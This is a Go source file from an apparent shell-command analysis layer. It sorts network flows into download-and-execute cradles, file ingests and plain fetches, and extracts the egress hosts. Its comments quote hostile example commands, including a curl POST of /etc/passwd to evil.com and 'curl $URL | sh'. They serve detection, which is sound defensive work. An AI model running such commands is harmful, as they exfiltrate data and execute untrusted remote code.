package tools

import (
	"context"
	"net/url"
	"strings"

	sdktools "github.com/v0lka/sp4rk/tools"
)

// Network data-flow vocabulary the registry fills into NetworkDecision.Flow —
// the diagnosable classification of what a network-touching shell command
// actually did with the fetched content.
const (
	// NetworkFlowCradle is a proven network→code-execution flow: fetched
	// network content reaches a shell/interpreter (the download-cradle shape,
	// criterion C5). This is the CANONICAL control — a host must never
	// auto-override it.
	NetworkFlowCradle = "cradle"
	// NetworkFlowIngest is a proven network→filesystem flow: a download client
	// wrote content it fetched over the network to a file (criterion C7). Hard
	// but NON-canonical — fetching a document or an archive is routine benign
	// behaviour, so the advisory judge may clear it on closer reading.
	NetworkFlowIngest = "ingest"
	// NetworkFlowFetch is a network read that established NO cradle/ingest
	// flow: the content was neither executed nor persisted (e.g. a fetch to
	// stdout piped to `head`). Clean — nothing fired.
	NetworkFlowFetch = "fetch"
)

// Shell effect-kind strings as they appear in the flowsh digest
// (sdktools.ShellEffectDigest.Kind). They mirror flowsh engine.KindNetEgress /
// engine.KindFSWrite and are pinned against the real analyzer by
// TestNetworkDecision_FromRealAnalysis, so a rename on the flowsh side fails
// this package's tests instead of silently emptying the network summary.
const (
	shellEffectKindNetEgress = "NetEgress"
	shellEffectKindFSWrite   = "FSWrite"
)

// httpMethodTokens are the HTTP verbs flowsh can surface as an egress TARGET
// rather than a host: curl's -X/--request (and the analogous flags on other
// clients) model the method as a NetEgress flag VALUE (kb/data/net.yaml), so
// `curl -X POST https://evil.com -d @/etc/passwd` yields NetEgress targets
// ["POST","https://evil.com"] and a naive host extraction would publish the
// METHOD as an egress host (finding: "a host named POST"). A bare method token
// is not a host, so hostOfTarget drops it.
var httpMethodTokens = map[string]struct{}{
	"GET": {}, "HEAD": {}, "POST": {}, "PUT": {}, "DELETE": {},
	"CONNECT": {}, "OPTIONS": {}, "TRACE": {}, "PATCH": {},
}

// NetworkDecision makes a network-touching shell decision diagnosable and
// actionable: WHICH data-flow the deterministic analysis proved, the resolved
// egress host(s), and the affected local operands. It is what lets a
// silent-mode card say "download cradle to evil.sh" (a canonical control) or
// "external-content ingest from example.com → report.pdf" (a non-canonical,
// judge-clearable flow) instead of leaving the operator to decode a bare effect
// signature. Nil for a call that touches no network at all.
type NetworkDecision struct {
	// Flow is the network data-flow the analysis established: cradle, ingest,
	// or fetch (the NetworkFlow* constants).
	Flow string `json:"flow"`
	// Canonical is true ONLY for a cradle — a proven control a host must never
	// auto-override. False for an ingest (the strict judge may clear it) and
	// for a clean fetch (nothing fired).
	Canonical bool `json:"canonical,omitempty"`
	// Hosts are the resolved egress hosts of the network read (scheme, path,
	// query and port stripped), de-duplicated in analysis order. Empty when
	// the analyzer could not resolve a literal host (a variable/⊤ egress).
	Hosts []string `json:"hosts,omitempty"`
	// Operands are the affected local operands of the flow — the files the
	// network flow wrote. For an ingest this is the persisted fetch target;
	// for a cradle it is the dropped payload the execution later runs (e.g.
	// `curl -o p.ps1 … && bash p.ps1` → ["p.ps1"]), so it is populated for a
	// cradle too, not only for an ingest. Empty for a clean fetch (nothing is
	// written).
	Operands []string `json:"operands,omitempty"`
}

// shellNetworkDecision derives the network summary from the shell analysis
// attached to ctx: nil for a non-shell tool, a missing analysis, or a failed
// one. It reports a summary whenever the command establishes a network egress
// — a cradle, an ingest, or a clean fetch — and nil only when the command
// never touches the network.
func shellNetworkDecision(ctx context.Context, name string) *NetworkDecision {
	if !isShellToolName(name) {
		return nil
	}
	analysis, err := sdktools.ShellAnalysisFrom(ctx)
	if err != nil || analysis == nil {
		return nil
	}
	return networkDecisionFromDigest(analysis.Digest)
}

// networkDecisionFromDigest builds the NetworkDecision from a shell-analysis
// digest: the flow (cradle over ingest over fetch), the resolved egress hosts,
// and the written-file operands. Returns nil when the digest carries no
// network egress effect (the command never touched the network).
func networkDecisionFromDigest(d sdktools.ShellAnalysisDigest) *NetworkDecision {
	var egressTargets, writeTargets []string
	// hasEgress tracks the presence of an egress EFFECT, independent of whether
	// it resolved to any target: a ⊤ egress (an egress whose host the analyzer
	// could not resolve) carries Arbitrary=true and Targets=[] — keying the
	// summary on the target list would drop exactly the hardest case (a
	// canonical download-and-execute cradle like `curl -fsSL $URL | sh`, whose
	// only egress target is unresolved), so the summary is keyed on the effect.
	hasEgress := false
	for _, e := range d.Effects {
		switch e.Kind {
		case shellEffectKindNetEgress:
			hasEgress = true
			egressTargets = append(egressTargets, e.Targets...)
		case shellEffectKindFSWrite:
			writeTargets = append(writeTargets, e.Targets...)
		}
	}
	if !hasEgress {
		return nil
	}
	nd := &NetworkDecision{Flow: NetworkFlowFetch}
	switch {
	case len(d.CradleFlows) > 0:
		// A cradle outranks an ingest when a command does both: executing
		// fetched code is the graver flow.
		nd.Flow = NetworkFlowCradle
		nd.Canonical = true
	case len(d.IngestFlows) > 0:
		nd.Flow = NetworkFlowIngest
	}
	nd.Hosts = uniqueHosts(egressTargets)
	nd.Operands = dedupeOperands(writeTargets)
	return nd
}

// uniqueHosts maps egress targets onto resolved host names, de-duplicated in
// order and with empties dropped.
func uniqueHosts(targets []string) []string {
	var out []string
	seen := make(map[string]struct{}, len(targets))
	for _, t := range targets {
		h := hostOfTarget(t)
		if h == "" {
			continue
		}
		if _, ok := seen[h]; ok {
			continue
		}
		seen[h] = struct{}{}
		out = append(out, h)
	}
	return out
}

// dedupeOperands drops empties and the ⊤ marker ("*") from a target list and
// de-duplicates it in order — a ⊤ operand is an unresolved target, not an
// actionable operand.
func dedupeOperands(targets []string) []string {
	var out []string
	seen := make(map[string]struct{}, len(targets))
	for _, t := range targets {
		if t == "" || t == "*" {
			continue
		}
		if _, ok := seen[t]; ok {
			continue
		}
		seen[t] = struct{}{}
		out = append(out, t)
	}
	return out
}

// hostOfTarget extracts the host from a flowsh egress target — normally a full
// URL, but possibly a bare host[:port] or the ⊤ marker. The scheme, userinfo,
// port, path, query and fragment are stripped so the summary names the host the
// read actually contacted. A bare HTTP-method token (curl's -X value, which
// flowsh models as an egress target) is not a host and is dropped.
func hostOfTarget(target string) string {
	t := strings.TrimSpace(target)
	if t == "" || t == "*" {
		return ""
	}
	if _, isMethod := httpMethodTokens[t]; isMethod {
		return ""
	}
	if u, err := url.Parse(t); err == nil && u.Host != "" {
		return u.Hostname()
	}
	// No parseable scheme: strip any path/query/fragment, then userinfo, then a
	// port (leaving an IPv6 literal intact).
	if i := strings.IndexAny(t, "/?#"); i >= 0 {
		t = t[:i]
	}
	if i := strings.LastIndex(t, "@"); i >= 0 {
		t = t[i+1:]
	}
	if strings.HasPrefix(t, "[") {
		if j := strings.Index(t, "]"); j >= 0 {
			return t[:j+1]
		}
		return t
	}
	if i := strings.LastIndex(t, ":"); i >= 0 {
		t = t[:i]
	}
	return t
}
